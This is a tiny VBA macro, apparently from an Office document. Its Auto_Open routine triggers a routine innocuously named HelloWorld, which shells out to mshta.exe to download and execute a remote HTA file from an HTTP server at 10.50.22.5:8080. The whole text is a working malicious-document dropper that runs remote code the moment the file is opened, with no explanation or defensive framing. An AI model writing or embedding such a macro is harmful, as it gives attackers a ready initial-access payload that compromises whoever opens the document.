Sub HelloWorld()
    PID = Shell("mshta.exe http://10.50.22.5:8080/LsYeaP6FLAa.hta")
End Sub

Sub Auto_Open()
    HelloWorld
End Sub

